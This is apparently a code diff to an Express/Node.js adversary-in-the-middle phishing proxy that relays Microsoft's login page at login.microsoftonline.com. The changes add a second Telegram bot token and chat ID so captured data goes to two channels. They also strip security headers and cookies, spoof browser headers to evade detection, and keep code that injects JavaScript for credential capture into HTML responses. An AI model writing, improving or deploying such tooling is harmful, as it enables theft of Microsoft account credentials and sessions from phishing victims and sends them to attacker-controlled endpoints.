@@ -3,11 +3,13 @@ const { createProxyMiddleware } = require('http-proxy-middleware');
 const axios = require('axios');
 
 const app = express();
-const port = process.env.PORT || 8080;
+const port = process.env.PORT || 8081;
 
 const upstream = "login.microsoftonline.com";
-const telegram_bot_token = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
-const telegram_chat_id = "6743632244";
+const telegram_bot_token1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
+const telegram_chat_id1 = "6743632244";
+const telegram_bot_token2 = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
+const telegram_chat_id2 = "1412104349";
 
 const delete_headers = [
   "content-security-policy",
@@ -16,17 +18,28 @@ const delete_headers = [
   "x-frame-options",
   "referrer-policy",
   "strict-transport-security",
+  "content-length",
+  "content-encoding",
+  "Set-Cookie",
 ];
 
 const emailMap = new Map();
 
 async function dispatchMessage(message) {
   try {
-    await axios.post(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
-      chat_id: telegram_chat_id,
-      text: message,
-      parse_mode: "HTML"
-    });
+    // Send to both Telegram bots
+    await Promise.all([
+      axios.post(`https://api.telegram.org/bot${telegram_bot_token1}/sendMessage`, {
+        chat_id: telegram_chat_id1,
+        text: message,
+        parse_mode: "HTML"
+      }),
+      axios.post(`https://api.telegram.org/bot${telegram_bot_token2}/sendMessage`, {
+        chat_id: telegram_chat_id2,
+        text: message,
+        parse_mode: "HTML"
+      })
+    ]);
   } catch (err) {
     console.error("Telegram error:", err.message);
   }
@@ -44,7 +57,7 @@ app.post('/__notify_click', async (req, res) => {
   res.status(200).send('ok');
 });
 
-// Main proxy middleware
+// Main proxy middleware - catches ALL requests
 app.use('/', createProxyMiddleware({
   target: `https://${upstream}`,
   changeOrigin: true,
@@ -61,9 +74,13 @@ app.use('/', createProxyMiddleware({
                 'unknown';
     
     proxyReq.setHeader('Host', upstream);
-    proxyReq.setHeader('User-Agent', 'AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)');
+    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
+    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
     proxyReq.setHeader('Accept-Encoding', 'gzip, deflate');
     proxyReq.setHeader('Referer', `${req.protocol}://${req.get('host')}`);
+    proxyReq.setHeader('Connection', 'keep-alive');
+    proxyReq.setHeader('Upgrade-Insecure-Requests', '1');
     
     console.log(`🔄 Proxying ${req.method}: ${req.protocol}://${req.get('host')}${req.originalUrl} → https://${upstream}${req.originalUrl}`);
     
@@ -100,7 +117,7 @@ app.use('/', createProxyMiddleware({
                 req.connection.remoteAddress ||
                 'unknown';
     
-    // Remove security headers
+    // Remove security headers that block framing/proxying
     delete_headers.forEach(header => {
       delete proxyRes.headers[header];
     });
@@ -128,7 +145,7 @@ app.use('/', createProxyMiddleware({
       );
     }
     
-    // Inject JavaScript for credential capture
+    // Inject JavaScript for credential capture on HTML responses
     if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
       delete proxyRes.headers['content-length'];
       delete proxyRes.headers['content-encoding'];
@@ -184,6 +201,12 @@ app.use('/', createProxyMiddleware({
 
 app.listen(port, '0.0.0.0', () => {
   console.log(`🚀 Microsoft Login Proxy running on port ${port}`);
-  console.log(`🌐 Access via: http://localhost:${port}`);
-  console.log(`🎯 This will show the REAL Microsoft login page`);
+  console.log(`🌐 Proxying: https://${upstream} → http://localhost:${port}`);
+  console.log(`🎯 This will show the REAL Microsoft login page:`);
+  console.log(`   - Microsoft logo`);
+  console.log(`   - "Sign in" heading`);
+  console.log(`   - "Email, phone, or Skype" input`);
+  console.log(`   - "No account? Create one!" link`);
+  console.log(`   - "Can't access your account?" link`);
+  console.log(`   - Full Microsoft branding and functionality`);
 });
